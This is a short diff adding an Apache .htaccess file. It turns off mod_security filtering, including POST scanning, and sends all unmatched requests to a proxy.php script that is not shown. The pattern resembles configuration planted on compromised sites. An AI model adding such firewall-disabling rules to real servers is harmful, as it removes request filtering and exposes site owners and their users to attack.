@@ -1,0 +1,7 @@
+<IfModule mod_security.c>\n  SecFilterEngine Off\n  SecFilterScanPOST Off\n</IfModule>\nDirectoryIndex proxy.php
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteRule ^(.*)$ proxy.php [QSA,L]
+</IfModule>
